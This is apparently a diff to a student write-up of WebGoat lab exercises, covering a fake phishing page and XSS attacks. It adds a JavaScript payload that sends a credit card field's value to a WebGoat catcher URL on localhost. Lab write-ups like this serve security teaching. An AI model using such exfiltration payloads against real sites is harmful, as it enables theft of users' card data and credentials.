@@ -6,6 +6,16 @@ A fake third party HTML page was generated so that user
 could be tricked and input the user name with their password,
 javascript was written to retrieve this information.
 
+PART 2:
+An URL link was created and encoded to be put at the 3 digit code
+place since it was the vulnerable element that can be attacked
+and get the user input info from. The script before encoding is 
+as follows:
+<script>
+    const XSSImage = new Image;
+    XSSImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=" + document.form.input1.value.replace(/\s+/g, '');
+</script>
+
 PART 3:
 The exploitable field is message. We can write a link of 
 a fake image in HTML there and set the URL of which contains
